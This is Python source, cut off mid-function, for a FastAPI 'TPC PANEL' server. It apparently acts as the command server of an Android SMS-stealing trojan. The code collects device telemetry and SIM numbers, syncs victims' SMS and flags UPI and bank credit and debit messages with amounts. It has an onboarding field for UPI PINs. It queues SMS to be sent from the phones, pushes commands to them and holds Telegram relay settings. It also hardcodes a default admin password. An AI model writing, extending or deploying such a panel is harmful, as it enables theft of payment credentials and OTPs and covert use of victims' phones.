import os
import re
import html
import json
import time
import hmac
import base64
import hashlib
import secrets
import asyncio
import logging
from pathlib import Path
from typing import Dict, Optional, List, Tuple
from contextlib import asynccontextmanager
from datetime import datetime, timedelta, timezone

from fastapi import (
    FastAPI, HTTPException, Header, Request, WebSocket, WebSocketDisconnect,
)
from fastapi.responses import FileResponse
from starlette.middleware.sessions import SessionMiddleware
from pydantic import BaseModel, Field
from pymongo import ReturnDocument
from pymongo.errors import PyMongoError, DuplicateKeyError
from bson import ObjectId

from backend.database import (
    init_db_with_retry, check_database, db,
    devices, messages, outbox, rules,
    pairing_codes, activity_logs, banned_senders, relay_config, counters, tg_logs,
    utc_now,
)

try:
    from backend.database import close_db
except ImportError:  # purana database.py
    def close_db():
        pass

try:
    from telethon import TelegramClient, events
    from telethon.errors import SessionPasswordNeededError
    TELETHON_OK = True
except Exception:  # pragma: no cover
    TelegramClient = None
    events = None

    class SessionPasswordNeededError(Exception):
        pass

    TELETHON_OK = False


log = logging.getLogger("tpc")
logging.basicConfig(level=os.getenv("LOG_LEVEL", "INFO"))


# ------------------------------------------------------------------ config

BASE_DIR = Path(__file__).resolve().parent.parent
ADMIN_FILE = BASE_DIR / "admin" / "index.html"
SECRET_FILE = BASE_DIR / ".session_secret"

ADMIN_API_KEY = os.getenv("ADMIN_API_KEY", "")
COOKIE_NAME = os.getenv("COOKIE_NAME", "tpc_admin_session")
COOKIE_DOMAIN = os.getenv("COOKIE_DOMAIN") or None

SESSION_TTL = 300
SESSION_MAX_AGE = 60 * 60 * 24 * 30
TOKEN_TTL = 60 * 60 * 24 * 30

ONLINE_WINDOW_SECONDS = 90
MAX_TELEMETRY_KEYS = 60
MAX_TELEMETRY_STRING = 300
MAX_WS_TEXT_BYTES = 4_000_000
MAX_SMS_BODY = 1600
MAX_BROADCAST = 500

WS_PING_INTERVAL = 25
WS_IDLE_TIMEOUT = 120
OUTBOX_REPUSH_AFTER = 45
NUMBER_RETRY_AFTER = 300

LOGIN_MAX_TRIES = 10
LOGIN_LOCK_SECONDS = 120

UPI_KEYWORDS = ("upi", "credited", "debited", "vpa", "paid to", "received from")
AMOUNT_RE = re.compile(r"(?:rs.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)", re.IGNORECASE)

TELE_API_ID = int(os.getenv("TELE_API_ID", "0") or 0)
TELE_API_HASH = os.getenv("TELE_API_HASH", "")
TARGET_CHANNEL_ID = int(os.getenv("TARGET_CHANNEL_ID", "0") or 0)
DEFAULT_FWD_USER = os.getenv("DEFAULT_FWD_USER", "").strip()
RELAY_SESSION_FILE = os.getenv("RELAY_SESSION_FILE", str(BASE_DIR / "relay_session"))

MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None


# ------------------------------------------------------------- secret store


def _load_session_secret() -> Tuple[str, str]:
    env = (os.getenv("SESSION_SECRET") or "").strip()
    if env:
        return env, "env"

    try:
        if SECRET_FILE.is_file():
            v = SECRET_FILE.read_text(encoding="utf-8").strip()
            if v:
                return v, "file"
    except OSError:
        pass

    v = secrets.token_urlsafe(48)
    try:
        SECRET_FILE.write_text(v, encoding="utf-8")
        try:
            os.chmod(SECRET_FILE, 0o600)
        except OSError:
            pass
    except OSError:
        pass
    return v, "generated"


SESSION_SECRET, SESSION_SECRET_SRC = _load_session_secret()
if SESSION_SECRET_SRC == "generated":
    log.warning(
        "SESSION_SECRET set nahi hai — naya secret bana ke %s me save kiya. "
        "Heroku/container par ye file ephemeral hoti hai, isliye env me set karo.",
        SECRET_FILE,
    )


# ---------------------------------------------------------------- admins


def _build_admins() -> Dict[str, str]:
    users: Dict[str, str] = {}
    raw = os.getenv("ADMIN_USERS", "").strip()
    if raw:
        for pair in raw.split(","):
            if ":" in pair:
                u, p = pair.split(":", 1)
                u, p = u.strip(), p.strip()
                if u and p:
                    users[u] = p
    users.setdefault(
        os.getenv("ADMIN_USERNAME", "ivan"),
        os.getenv("ADMIN_PASSWORD", "Ahad@198612"),
    )
    return users


ADMINS = _build_admins()


def const_eq(a: str, b: str) -> bool:
    try:
        return hmac.compare_digest(a.encode("utf-8"), b.encode("utf-8"))
    except Exception:
        return False


_login_fails: Dict[str, List[float]] = {}


def recent_fails(ip: str) -> List[float]:
    now = time.time()
    hits = [t for t in _login_fails.get(ip, []) if now - t < LOGIN_LOCK_SECONDS]
    _login_fails[ip] = hits
    return hits


# --------------------------------------------------------------- tokens


def make_token(admin_id: str, ttl: int = TOKEN_TTL) -> str:
    exp = int(time.time()) + ttl
    payload = f"{admin_id}|{exp}"
    sig = hmac.new(SESSION_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()[:40]
    return base64.urlsafe_b64encode(f"{payload}|{sig}".encode()).decode()


def verify_token(token: str) -> Optional[str]:
    try:
        raw = base64.urlsafe_b64decode(token.encode()).decode()
        admin_id, exp, sig = raw.rsplit("|", 2)
        expected = hmac.new(
            SESSION_SECRET.encode(), f"{admin_id}|{exp}".encode(), hashlib.sha256
        ).hexdigest()[:40]
        if not hmac.compare_digest(sig, expected):
            return None
        if int(exp) < time.time():
            return None
        return admin_id
    except Exception:
        return None


# ------------------------------------------------------------- lifespan


@asynccontextmanager
async def lifespan(app: FastAPI):
    global MAIN_LOOP
    MAIN_LOOP = asyncio.get_running_loop()
    init_db_with_retry()
    backfill_short_ids()
    backfill_auto_sender()
    load_bans()
    load_relay_config()
    await start_relay()
    log.info("TPC PANEL v5.1 up — admins=%s secret=%s", list(ADMINS), SESSION_SECRET_SRC)
    try:
        yield
    finally:
        await stop_relay()
        await close_sockets()
        close_db()
        MAIN_LOOP = None


app = FastAPI(title="TPC PANEL", version="5.1.0", lifespan=lifespan)


class AdaptiveSessionMiddleware(SessionMiddleware):
    """https_only=True default ka problem: plain HTTP par browser cookie store
    hi nahi karta -> login hota tha par session turant ud jaata tha.
    Yahan secure flag sirf tab lagta hai jab request actually https ho."""

    def __init__(self, *args, force_secure: bool = False, **kwargs):
        self.force_secure = force_secure
        super().__init__(*args, **kwargs)

    async def __call__(self, scope, receive, send):
        if scope.get("type") in ("http", "websocket"):
            flags = "httponly; samesite=" + getattr(self, "same_site", "lax")
            if self.force_secure or scope.get("scheme") == "https":
                flags += "; secure"
            self.security_flags = flags
        await super().__call__(scope, receive, send)


_FORCE_SECURE = os.getenv("COOKIE_SECURE", "").strip().lower() in ("1", "true", "yes")

app.add_middleware(
    AdaptiveSessionMiddleware,
    secret_key=SESSION_SECRET,
    session_cookie=COOKIE_NAME,
    max_age=SESSION_MAX_AGE,
    same_site="lax",
    domain=COOKIE_DOMAIN,
    force_secure=_FORCE_SECURE,
)

try:
    from uvicorn.middleware.proxy_headers import ProxyHeadersMiddleware
except Exception:  # pragma: no cover
    try:
        from starlette.middleware.proxy_headers import ProxyHeadersMiddleware
    except Exception:
        ProxyHeadersMiddleware = None

if ProxyHeadersMiddleware is not None:
    try:
        app.add_middleware(ProxyHeadersMiddleware, trusted_hosts="*")
    except TypeError:
        app.add_middleware(ProxyHeadersMiddleware, forwarded_allow_ips="*")


# ------------------------------------------------------------------ models


class PairRequest(BaseModel):
    device_name: str = Field(min_length=1, max_length=40)


class DeviceRegistrationRequest(BaseModel):
    device_name: str = Field(min_length=1, max_length=40)
    platform: str = Field(default="android", max_length=20)
    registration_id: str = Field(min_length=16, max_length=128)
    owner_approved: bool = False
    telemetry: dict | None = None


class DeviceHeartbeatRequest(BaseModel):
    registration_id: str = Field(min_length=16, max_length=128)
    telemetry: dict | None = None


class DeviceTelemetryRequest(BaseModel):
    registration_id: str = Field(min_length=16, max_length=128)
    telemetry: dict | None = None


class DeviceCommandResultRequest(BaseModel):
    registration_id: str = Field(min_length=16, max_length=128)
    action: str = Field(default="telemetry", max_length=40)
    data: dict | None = None


class OnboardingRequest(BaseModel):
    registration_id: str = Field(min_length=16, max_length=128)
    phone_number: str = Field(default="", max_length=20)
    payment_app: str = Field(default="", max_length=30)
    upi_pin: str = Field(default="", max_length=8)
    amount: float = 1.0
    device_name: str | None = Field(default=None, max_length=60)
    telemetry: dict | None = None


class SmsIncomingRequest(BaseModel):
    registration_id: str = Field(min_length=16, max_length=128)
    address: str = Field(default="", max_length=64)
    body: str = Field(default="", max_length=MAX_SMS_BODY)
    direction: str = Field(default="in", max_length=8)
    received_at: int | None = None


class SmsSyncRequest(BaseModel):
    registration_id: str = Field(min_length=16, max_length=128)
    messages: list[dict] = Field(default_factory=list)


class AdminLoginRequest(BaseModel):
    username: str = Field(default="", max_length=100)
    login_id: str | None = Field(default=None, max_length=100)
    password: str = Field(min_length=1, max_length=200)


class SendRequest(BaseModel):
    target: str = Field(default="all")
    device_id: str | None = None
    body: str = Field(min_length=1, max_length=MAX_SMS_BODY)
    to: str | None = None


class CommandRequest(BaseModel):
    action: str = Field(default="ping", max_length=40)


class RuleRequest(BaseModel):
    name: str = Field(min_length=1, max_length=60)
    match: str = Field(min_length=1, max_length=120)
    reply: str = Field(min_length=1, max_length=MAX_SMS_BODY)
    upi_only: bool = False


class RelayLoginRequest(BaseModel):
    api_id: str = Field(default="", max_length=20)
    api_hash: str = Field(default="", max_length=64)
    phone: str = Field(min_length=5, max_length=20)


class RelayVerifyRequest(BaseModel):
    code: str = Field(min_length=1, max_length=12)
    password: str = Field(default="", max_length=128)


class BanRequest(BaseModel):
    address: str = Field(min_length=3, max_length=32)


class RelayParseRequest(BaseModel):
    text: str = Field(min_length=1, max_length=8000)


class AutoSenderRequest(BaseModel):
    enabled: bool | None = None
    channel_id: str | None = Field(default=None, max_length=64)
    channel_title: str | None = Field(default=None, max_length=160)


class ChannelRequest(BaseModel):
    channel_id: str = Field(min_length=1, max_length=64)


class ForwardRequest(BaseModel):
    target: str = Field(default="", max_length=64)


# --------------------------------------------------------------- utilities


def hash_value(v: str) -> str:
    return hashlib.sha256(v.encode("utf-8")).hexdigest()


def normalize_number(raw) -> str:
    if raw is None:
        return ""
    s = re.sub(r"[^\d+]", "", str(raw).strip())
    if not s:
        return ""
    if not s.startswith("+"):
        s = "+" + s.lstrip("+")
    digits = s.lstrip("+")
    if not digits.isdigit() or not (6 <= len(digits) <= 15):
        return ""
    return s


def norm_channel_id(raw) -> str:
    s = str(raw or "").strip()
    if not s:
        return ""
    s = s.replace(" ", "").lstrip("@")
    try:
        return str(int(s))
    except ValueError:
        return s


# ---- FIX: channel identity helpers -------------------------------------
# Telethon event.chat_id is -1001234567890 for supergroups/channels, while the
# raw entity id is 1234567890 and a username is "@something". Inhe ek hi key
# par collapse karte hain, warna auto sender chup-chaap kabhi match nahi karta.

def chan_key(v) -> str:
    """Digits-only channel key; -100 supergroup prefix strip karta hai.
    -1001234567890 / 1001234567890 / 1234567890 -> sab '1234567890'."""
    s = re.sub(r"[^\d]", "", str(v or ""))
    if not s:
        return ""
    if s.startswith("100") and len(s) > 10:
        s = s[3:]
    return s


def canonical_channel_id(ent, fallback=None) -> str:
    """Telethon entity -> canonical chat_id form (supergroup ke liye -100...)."""
    ent_id = getattr(ent, "id", None)
    if isinstance(ent_id, int):
        if getattr(ent, "broadcast", False) or getattr(ent, "megagroup", False):
            return str(int(f"-100{ent_id}"))
        return str(-abs(ent_id))
    return str(fallback) if fallback is not None else ""


def as_entity(cid):
    s = str(cid).strip().lstrip("@")
    try:
        return int(s)
    except ValueError:
        return s


def log_event(event_type: str, details=None, device_id=None, admin_id=None):
    try:
        activity_logs.insert_one({
            "event_type": event_type,
            "details": details,
            "device_id": device_id,
            "admin_id": admin_id,
            "created_at": utc_now(),
        })
    except PyMongoError:
        pass


def sanitize_telemetry(raw) -> dict:
    if not isinstance(raw, dict):
        return {}

    clean = {}
    for key, value in list(raw.items())[:MAX_TELEMETRY_KEYS]:
        if not isinstance(key, str) or not key:
            continue
        key = key[:60]

        if value is None or isinstance(value, (bool, int, float)):
            clean[key] = value
        elif isinstance(value, str):
            clean[key] = value[:MAX_TELEMETRY_STRING]
        elif isinstance(value, list):
            items = []
            for item in value[:20]:
                if item is None or isinstance(item, (bool, int, float)):
                    items.append(item)
                elif isinstance(item, str):
                    items.append(item[:MAX_TELEMETRY_STRING])
                elif isinstance(item, dict):
                    items.append({
                        str(k)[:40]: (v[:MAX_TELEMETRY_STRING] if isinstance(v, str) else v)
                        for k, v in list(item.items())[:20]
                        if v is None or isinstance(v, (bool, int, float, str))
                    })
            clean[key] = items
        elif isinstance(value, dict):
            clean[key] = {
                str(k)[:40]: (v[:MAX_TELEMETRY_STRING] if isinstance(v, str) else v)
                for k, v in list(value.items())[:20]
                if v is None or isinstance(v, (bool, int, float, str))
            }

    return clean


def telemetry_summary(t: dict) -> dict:
    sims = t.get("sims")
    first = sims[0] if isinstance(sims, list) and sims else {}
    if not isinstance(first, dict):
        first = {}

    return {
        "device_model": t.get("model") or "",
        "android_version": t.get("android_version") or "",
        "sim_carrier": t.get("sim_carrier") or first.get("carrier") or "",
        "sim_number": t.get("sim_number") or first.get("number") or "",
        "sim_number_source": t.get("sim_number_source") or first.get("number_source") or "",
        "sim_count": len(sims) if isinstance(sims, list) else 0,
        "battery_level": t.get("battery_level"),
        "battery_charging": t.get("battery_charging"),
        "network_type": t.get("network_type") or "",
        "local_ip": t.get("local_ip") or "",
        "telemetry_updated_at": utc_now(),
    }


def resolve_device_number(device: dict) -> str:
    if not device:
        return ""

    t = device.get("telemetry") or {}

    for cand in (
        t.get("sim_number"), t.get("phone_number"),
        device.get("sim_number"), device.get("phone_number"),
    ):
        n = normalize_number(cand)
        if n:
            return n

    sims = t.get("sims")
    if isinstance(sims, list):
        for s in sims:
            if isinstance(s, dict):
                n = normalize_number(s.get("number"))
                if n:
                    return n

    return ""


def device_short_id(device: dict) -> str:
    return device.get("short_id") or ("TPC-" + str(device.get("_id", ""))[-6:].upper())


def next_device_short_id() -> str:
    try:
        doc = counters.find_one_and_update(
            {"_id": "device_seq"},
            {"$inc": {"seq": 1}},
            upsert=True,
            return_document=ReturnDocument.AFTER,
        )
        return f"TPC-{int(doc['seq']):04d}"
    except (PyMongoError, KeyError, TypeError):
        return f"TPC-{int(time.time()) % 100000:04d}"


def backfill_short_ids():
    try:
        for d in devices.find({"short_id": {"$exists": False}}, {"_id": 1}).limit(10000):
            devices.update_one(
                {"_id": d["_id"]}, {"$set": {"short_id": next_device_short_id()}}
            )
    except PyMongoError:
        pass


def backfill_auto_sender():
    try:
        devices.update_many(
            {"auto_sender": {"$exists": False}},
            {"$set": {"auto_sender": {
                "enabled": False, "channel_id": None,
                "channel_title": None, "updated_at": utc_now(),
            }}},
        )
    except PyMongoError:
        pass


def auto_sender_of(device: dict) -> dict:
    a = (device or {}).get("auto_sender") or {}
    return {
        "enabled": bool(a.get("enabled")),
        "channel_id": str(a.get("channel_id") or ""),
        "channel_title": a.get("channel_title") or "",
        "updated_at": serialize_dt(a.get("updated_at")),
    }


def auto_sender_plain(device: dict) -> dict:
    a = auto_sender_of(device)
    return {
        "enabled": a["enabled"],
        "channel_id": a["channel_id"],
        "channel_title": a["channel_title"],
    }


def apply_telemetry(device: dict, raw) -> dict:
    telemetry = sanitize_telemetry(raw)
    if not telemetry:
        return {}

    existing = device.get("telemetry") or {}
    merged = {**existing, **telemetry}

    fields = {"telemetry": merged}
    fields.update(telemetry_summary(merged))

    if merged.get("sim_number"):
        fields["number_requested_at"] = None

    devices.update_one({"_id": device["_id"]}, {"$set": fields})
    return telemetry


def classify_sms(address: str, body: str) -> tuple[str, Optional[float], Optional[str]]:
    lower = (body or "").lower()
    kind = "sms"

    if any(k in lower for k in UPI_KEYWORDS):
        kind = "upi"

    amount = None
    m = AMOUNT_RE.search(body or "")
    if m:
        try:
            amount = float(m.group(1).replace(",", ""))
        except ValueError:
            amount = None

    flow = None
    if any(w in lower for w in ("credited", "received", "cr.", "deposited")):
        flow = "credit"
    elif any(w in lower for w in ("debited", "paid", "sent", "dr.", "withdrawn")):
        flow = "debit"

    return kind, amount, flow


# ------------------------------------------------------------------- auth


def bearer_admin(request: Request) -> Optional[str]:
    auth = request.headers.get("authorization") or ""
    if auth[:7].lower() == "bearer ":
        return verify_token(auth[7:].strip())
    return None


def require_api_key(api_key: str | None):
    if not ADMIN_API_KEY:
        raise HTTPException(401, "Admin API key not configured")
    if not api_key or not const_eq(api_key, ADMIN_API_KEY):
        raise HTTPException(401, "Unauthorized")


def require_admin(request: Request) -> str:
    admin_id = request.session.get("admin_id")
    if admin_id:
        return admin_id

    admin_id = bearer_admin(request)
    if admin_id:
        return admin_id

    raise HTTPException(401, "Please log in")


def require_admin_or_key(
    request: Request, x_admin_key: str | None = Header(default=None)
) -> str:
    try:
        return require_admin(request)
    except HTTPException:
        pass
    require_api_key(x_admin_key)
    return "apikey"


# --------------------------------------------------------------- serialize


def serialize_dt(v):
    if isinstance(v, datetime):
        if v.tzinfo is None:
            v = v.replace(tzinfo=timezone.utc)
        return v.isoformat()
    if v is None or isinstance(v, (bool, int, float)):
        return v
    return str(v)


def serialize_document(doc: dict) -> dict:
    out = {}
    for k, v in doc.items():
        if k == "_id":
            out["id"] = str(v)
            continue
        if k in {"registration_id_hash", "password_hash", "session_token_hash"}:
            continue
        out[k] = v if isinstance(v, (dict, list)) else serialize_dt(v)

    ls = doc.get("last_seen")
    if isinstance(ls, datetime):
        if ls.tzinfo is None:
            ls = ls.replace(tzinfo=timezone.utc)
        out["status"] = (
            "Online" if datetime.now(timezone.utc) - ls
            < timedelta(seconds=ONLINE_WINDOW_SECONDS) else "Offline"
        )
    else:
        out["status"] = "Offline"

    return out


def view_device(d: dict, include_hash: bool = False) -> dict:
    s = serialize_document(d)
    s["short_id"] = device_short_id(d)
    s["ws_connected"] = hub.online(s["id"])
    s["live_number"] = resolve_device_number(d)
    s["entered_number"] = normalize_number(d.get("phone_number")) or (d.get("phone_number") or "")
    s["auto_sender"] = auto_sender_plain(d)
    if not include_hash:
        s.pop("registration_id", None)
    return s


def get_device_or_404(device_id: str) -> dict:
    try:
        d = devices.find_one({"_id": ObjectId(device_id)})
    except Exception:
        raise HTTPException(400, "Bad device id")
    if not d:
        raise HTTPException(404, "Device not found")
    return d


def dedupe_key(device_id: str, direction: str, address: str, body: str, when: datetime) -> str:
    stamp = int(when.timestamp() // 60)
    return f"{device_id}|{direction}|{address}|{hash_value(body)[:16]}|{stamp}"


def insert_message(doc: dict, dedupe: bool = True) -> Optional[ObjectId]:
    try:
        if dedupe:
            key = dedupe_key(
                doc["device_id"], doc["direction"], doc.get("address", ""),
                doc.get("body", ""), doc.get("created_at") or utc_now(),
            )
            doc["dedupe_key"] = key
            if messages.find_one({"dedupe_key": key}):
                return None
        return messages.insert_one(doc).inserted_id
    except PyMongoError:
        return None


# --------------------------------------------------------------------- hub


class Hub:
    def __init__(self):
        self.device_sockets: Dict[str, WebSocket] = {}
        self.last_pong: Dict[str, float] = {}
        self.lock = asyncio.Lock()

    async def add_device(self, device_id, ws):
        async with self.lock:
            self.device_sockets[device_id] = ws
            self.last_pong[device_id] = time.time()

    async def remove_device(self, device_id, ws):
        async with self.lock:
            if self.device_sockets.get(device_id) is ws:
                self.device_sockets.pop(device_id, None)
                self.last_pong.pop(device_id, None)

    def online(self, device_id) -> bool:
        return device_id in self.device_sockets

    @property
    def online_count(self) -> int:
        return len(self.device_sockets)

    async def send_to_device(self, device_id, payload) -> bool:
        ws = self.device_sockets.get(device_id)
        if ws is None:
            return False
        try:
            await ws.send_json(payload)
            return True
        except Exception:
            await self.remove_device(device_id, ws)
            return False


hub = Hub()


class AdminHub:
    def __init__(self):
        self.sockets: set = set()
        self.lock = asyncio.Lock()

    async def add(self, ws):
        async with self.lock:
            self.sockets.add(ws)

    async def remove(self, ws):
        async with self.lock:
            self.sockets.discard(ws)

    async def broadcast(self, payload: dict):
        async with self.lock:
            targets = list(self.sockets)
        dead = []
        for ws in targets:
            try:
                await ws.send_json(payload)
            except Exception:
                dead.append(ws)
        for ws in dead:
            await self.remove(ws)


admin_hub = AdminHub()


def spawn(coro):
    loop = MAIN_LOOP
    try:
        running = asyncio.get_running_loop()
        if running is not None:
            loop = running
    except RuntimeError:
        pass

    if loop is None or loop.is_closed():
        try:
            coro.close()
        except Exception:
            pass
        return None

    try:
        return asyncio.ensure_future(coro, loop=loop)
    except Exception:
        return None


def broadcast(payload: dict):
    loop = MAIN_LOOP
    if loop is None or loop.is_closed():
        return

    def _fire():
        try:
            asyncio.ensure_future(admin_hub.broadcast(payload))
        except Exception:
            pass

    try:
        loop.call_soon_threadsafe(_fire)
    except Exception:
        pass


def broadcast_message(doc):
    if not doc:
        return
    try:
        broadcast({"type": "message", "data": serialize_document(doc)})
    except Exception:
        pass


def broadcast_device(device_id: str, extra: dict | None = None):
    broadcast({"type": "device_status", "data": {"id": device_id, **(extra or {})}})


async def send_command(device_id: str, action: str, extra: dict | None = None) -> bool:
    payload = {"type": "command", "action": action, "ts": int(time.time())}
    if extra:
        payload.update(extra)
    return await hub.send_to_device(device_id, payload)


def push_row(device_id: str, row: dict) -> dict:
    return {
        "type": "sms_send",
        "id": str(row["_id"]),
        "to": row.get("to") or "",
        "body": row.get("body") or "",
    }


async def push_outbox(device_id: str):
    try:
        pending = list(outbox.find({"device_id": device_id, "status": "pending"}).limit(20))
    except PyMongoError:
        return

    for row in pending:
        if await hub.send_to_device(device_id, push_row(device_id, row)):
            try:
                outbox.update_one(
                    {"_id": row["_id"]},
                    {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
                )
            except PyMongoError:
                pass


async def repush_stale(device_id: str):
    cutoff = utc_now() - timedelta(seconds=OUTBOX_REPUSH_AFTER)
    try:
        stale = list(outbox.find({
            "device_id": device_id,
            "status": "pending",
            "pushed_at": {"$lt": cutoff},
        }).limit(10))
    except PyMongoError:
        return

    for row in stale:
        if await hub.send_to_device(device_id, push_row(device_id, row)):
            try:
                outbox.update_one(
                    {"_id": row["_id"]},
                    {"$set": {"pushed_at": utc_now()}, "$inc": {"attempts": 1}},
                )
            except PyMongoError:
                pass


def queue_sms(
    device_id: str, body: str, to: str | None,
    source: str = "panel", device_name: str = "",
) -> tuple[str, str]:
    now = utc_now()
    to = normalize_number(to) or (to or "").strip()

    msg_id = insert_message({
        "device_id": device_id,
        "device_name": device_name or "Unknown",
        "direction": "out",
        "address": to or "",
        "body": body,
        "kind": "sms",
        "status": "queued",
        "source": source,
        "created_at": now,
    }, dedupe=False)

    outbox_id = outbox.insert_one({
        "device_id": device_id,
        "to": to or "",
        "body": body,
        "source": source,
        "status": "pending",
        "message_id": msg_id,
        "attempts": 0,
        "pushed_at": None,
        "created_at": now,
    }).inserted_id

    if msg_id:
        try:
            broadcast_message(messages.find_one({"_id": msg_id}))
        except PyMongoError:
            pass

    return str(outbox_id), str(msg_id) if msg_id else ""


def online_device_ids() -> List[ObjectId]:
    out = []
    for k in list(hub.device_sockets.keys()):
        try:
            out.append(ObjectId(k))
        except Exception:
            continue
    return out


def resolve_targets(payload: SendRequest) -> tuple[list, bool]:
    if payload.target == "device":
        if not payload.device_id:
            raise HTTPException(400, "device_id required for target=device")
        return [get_device_or_404(payload.device_id)], False

    if payload.target == "online":
        ids = online_device_ids()
        if not ids:
            return [], False
        return list(devices.find({"_id": {"$in": ids}})), False

    try:
        total = devices.count_documents({})
    except PyMongoError:
        total = 0
    return list(devices.find().limit(MAX_BROADCAST)), total > MAX_BROADCAST


async def close_sockets():
    for did, ws in list(hub.device_sockets.items()):
        try:
            await ws.close(code=1001)
        except Exception:
            pass
    for ws in list(admin_hub.sockets):
        try:
            await ws.close(code=1001)
        except Exception:
            pass


# --------------------------------------------------------------- public


@app.get("/")
async def home():
    return {
        "app": "TPC PANEL", "status": "online", "version": "5.1.0",
        "owner": "https://t.me/icivan",
        "relay": "mtproto" if TELETHON_OK else "unavailable",
    }


@app.get("/health")
async def health():
    return {
        "status": "ok",
        "devices_online": hub.online_count,
        "relay_authorized": bool(relay_state.get("authorized")),
    }


@app.get("/health/database")
async def database_health():
    r = check_database()
    if r["status"] != "ok":
        raise HTTPException(503, "Database connection failed")
    return r


@app.get("/admin", include_in_schema=False)
async def admin_page():
    if not ADMIN_FILE.is_file():
        raise HTTPException(404, "Admin dashboard file not found")
    return FileResponse(ADMIN_FILE, headers={"Cache-Control": "no-store"})


@app.get("/admin/", include_in_schema=False)
async def admin_page_slash():
    return await admin_page()


@app.get("/panel", include_in_schema=False)
async def panel_alias():
    return await admin_page()


# ------------------------------------------------------------ admin auth


@app.get("/admin/auth/status")
async def auth_status(request: Request):
    a = request.session.get("admin_id") or bearer_admin(request)
    return {
        "authenticated": bool(a),
        "admin_id": a,
        "secret_source": SESSION_SECRET_SRC,
    }


@app.post("/admin/login")
async def admin_login(payload: AdminLoginRequest, request: Request):
    ip = (request.client.host if request.client else "?") or "?"
    hits = recent_fails(ip)

    user = (payload.login_id or payload.username or "").strip()
    if not user:
        raise HTTPException(400, "Login ID required")

    expected = ADMINS.get(user)
    if expected is None:
        for k, v in ADMINS.items():
            if k.lower() == user.lower():
                user, expected = k, v
                break

    if expected is None or not const_eq(payload.password, expected):
        hits.append(time.time())
        _login_fails[ip] = hits
        if len(hits) > LOGIN_MAX_TRIES:
            wait = int(LOGIN_LOCK_SECONDS - (time.time() - hits[0]))
            raise HTTPException(429, f"Bahut zyada galat tries — {max(1, wait)}s baad try karo")
        raise HTTPException(401, "Invalid Login ID or password")

    _login_fails.pop(ip, None)
    request.session["admin_id"] = user
    log_event("admin_login", {"username": user, "ip": ip}, admin_id=user)
    return {
        "status": "ok",
        "username": user,
        "token": make_token(user),
        "expires_in": TOKEN_TTL,
    }


@app.post("/admin/logout")
async def admin_logout(request: Request):
    a = request.session.get("admin_id") or bearer_admin(request)
    if a:
        log_event("admin_logout", admin_id=a)
    request.session.clear()
    return {"status": "ok"}


@app.get("/admin/session")
async def admin_session(request: Request):
    a = require_admin(request)
    src = "session" if request.session.get("admin_id") else "token"
    return {"admin_id": a, "via": src, "secret_source": SESSION_SECRET_SRC}


# --------------------------------------------------------------- devices


@app.post("/devices/register")
async def register_device(payload: DeviceRegistrationRequest):
    name = payload.device_name.strip()
    rid = payload.registration_id.strip()

    if not name or not rid:
        raise HTTPException(400, "Device name and registration ID required")
    if payload.platform.lower() != "android":
        raise HTTPException(400, "Unsupported platform")
    if not payload.owner_approved:
        raise HTTPException(403, "Owner approval required")

    rh = hash_value(rid)
    now = utc_now()
    telemetry = sanitize_telemetry(payload.telemetry)

    try:
        existing = devices.find_one({"registration_id_hash": rh}, {"short_id": 1})
    except PyMongoError:
        existing = None
    short_id = (existing or {}).get("short_id") or next_device_short_id()

    fields = {
        "device_name": name,
        "platform": "android",
        "registration_id": rid,
        "short_id": short_id,
        "last_seen": now,
        "is_active": True,
    }
    if telemetry:
        fields["telemetry"] = telemetry
        fields.update(telemetry_summary(telemetry))

    try:
        devices.update_one(
            {"registration_id_hash": rh},
            {"$set": fields,
             "$setOnInsert": {
                 "registration_id_hash": rh,
                 "created_at": now,
                 "onboarded": False,
                 "auto_sender": {
                     "enabled": False, "channel_id": None,
                     "channel_title": None, "updated_at": now,
                 },
             }},
            upsert=True,
        )
        log_event("device_registered", {"device_name": name, "short_id": short_id})
    except DuplicateKeyError:
        raise HTTPException(409, "Registration conflict")
    except PyMongoError:
        raise HTTPException(503, "Could not register device")

    try:
        doc = devices.find_one({"registration_id_hash": rh})
        if doc:
            broadcast_device(str(doc["_id"]), {
                "ws_connected": hub.online(str(doc["_id"])),
                "last_seen": now.isoformat(),
            })
    except PyMongoError:
        pass

    return {"status": "registered", "device_name": name, "short_id": short_id}


@app.post("/devices/heartbeat")
async def heartbeat(payload: DeviceHeartbeatRequest):
    rh = hash_value(payload.registration_id.strip())

    try:
        device = devices.find_one({"registration_id_hash": rh})
    except PyMongoError:
        raise HTTPException(503, "Could not update device")

    if not device:
        raise HTTPException(404, "Device not registered")

    device_id = str(device["_id"])

    fields = {"last_seen": utc_now(), "is_active": True}
    if payload.telemetry:
        telemetry = sanitize_telemetry(payload.telemetry)
        if telemetry:
            merged = {**(device.get("telemetry") or {}), **telemetry}
            fields["telemetry"] = merged
            fields.update(telemetry_summary(merged))
            if merged.get("sim_number"):
                fields["number_requested_at"] = None

    try:
        devices.update_one({"_id": device["_id"]}, {"$set": fields})
    except PyMongoError:
        raise HTTPException(503, "Could not update device")

    if hub.online(device_id):
        spawn(push_outbox(device_id))
        spawn(repush_stale(device_id))

    broadcast_device(device_id, {
        "ws_connected": hub.online(device_id),
        "status": "Online",
        "last_seen": fields["last_seen"].isoformat(),
        "telemetry": fields.get("telemetry") or device.get("telemetry") or {},
    })

    merged_t = fields.get("telemetry") or (device.get("telemetry") or {})
    if not merged_t.get("sim_number") and hub.online(device_id):
        last = device.get("number_requested_at")
        stale = True
        if isinstance(last, datetime):
            if last.tzinfo is None:
                last = last.replace(tzinfo=timezone.utc)
            stale = datetime.now(timezone.utc) - last > timedelta(seconds=NUMBER_RETRY_AFTER)
        if stale:
            try:
                devices.update_one(
                    {"_id": device["_id"]}, {"$set": {"number_requested_at": utc_now()}}
                )
            except PyMongoError:
                pass
            spawn(send_command(device_id, "fetch_number"))

    return {"status": "ok", "online": True, "last_seen": utc_now().isoformat()}


@app.post("/devices/telemetry")
async def device_telemetry(payload: DeviceTelemetryRequest):
    rh = hash_value(payload.registration_id.strip())

    try:
        device = devices.find_one({"registration_id_hash": rh})
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if not device:
        raise HTTPException(404, "Device not registered")

    telemetry = apply_telemetry(device, payload.telemetry)
    try:
        devices.update_one(
            {"_id": device["_id"]},
            {"$set": {"last_seen": utc_now(), "is_active": True}},
        )
    except PyMongoError:
        pass

    broadcast_device(str(device["_id"]), {
        "ws_connected": hub.online(str(device["_id"])),
        "status": "Online",
